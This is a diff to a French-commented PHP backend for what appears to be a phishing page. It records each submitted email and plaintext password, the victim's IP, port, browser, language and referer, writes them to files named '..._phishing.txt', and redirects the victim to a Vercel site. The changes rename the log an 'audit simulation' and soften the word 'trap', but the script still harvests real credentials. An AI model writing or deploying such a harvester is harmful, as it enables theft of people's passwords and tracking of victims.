@@ -23,34 +23,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $ip = $_SERVER['REMOTE_ADDR'];
     }
 
-    // Récupération du User-Agent (Contient le système d'exploitation et le navigateur)
+    // Récupération des données réseau et système supplémentaires
+    $port_source = isset($_SERVER['REMOTE_PORT']) ? $_SERVER['REMOTE_PORT'] : 'Inconnu';
     $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Inconnu';
-    
-    // Récupération de la langue du système
     $language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Inconnu';
-    
-    // Récupération de la page précédente (Utile pour savoir d'où vient le clic)
     $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct ou masqué';
+    $protocol = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'Inconnu';
+    $conn_type = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'HTTPS' : 'HTTP';
 
-    // 3. Formatage propre et lisible pour le contenu du rapport
+    // 3. Formatage propre et lisible pour le contenu du rapport d'audit
     $log_entry = "==================================================\n";
-    $log_entry .= "[-] Date/Heure : $date\n";
-    $log_entry .= "[-] Cible      : $email\n";
-    $log_entry .= "[-] Mot de passe: $password\n";
-    $log_entry .= "[-] Adresse IP : $ip\n";
-    $log_entry .= "[-] Navigateur : $user_agent\n";
-    $log_entry .= "[-] Langue     : $language\n";
-    $log_entry .= "[-] Venu de    : $referer\n";
+    $log_entry .= "[+] RAPPORT D'AUDIT - SIMULATION COMPROMISSION    \n";
+    $log_entry .= "==================================================\n";
+    $log_entry .= "[-] Date/Heure    : $date\n";
+    $log_entry .= "[-] Cible         : $email\n";
+    $log_entry .= "[-] Mot de passe  : $password\n";
+    $log_entry .= "[-] Adresse IP    : $ip\n";
+    $log_entry .= "[-] Port Source   : $port_source\n";
+    $log_entry .= "[-] Canal/Sécurité: $protocol ($conn_type)\n";
+    $log_entry .= "[-] Navigateur/OS : $user_agent\n";
+    $log_entry .= "[-] Langue Cible  : $language\n";
+    $log_entry .= "[-] Venu de       : $referer\n";
     $log_entry .= "==================================================\n\n";
 
     // 4. Génération dynamique du nom du fichier au format demandé
-    // Exemple de rendu : 2026-11-10_07h55m00s_test_at_gmail_com_phishing.txt
     $filename = $date_for_filename . "_" . $email_clean . "_phishing.txt";
 
     // Écriture dans le fichier local unique
     file_put_contents($filename, $log_entry, FILE_APPEND);
 
-    // 5. Redirection finale pour clore le piège
+    // 5. Redirection finale pour clore le scénario de manière crédible
     header("Location: https://web-frontend-b0gnhkkg0-clubinfoepo-3331.vercel.app");
     exit();
 }
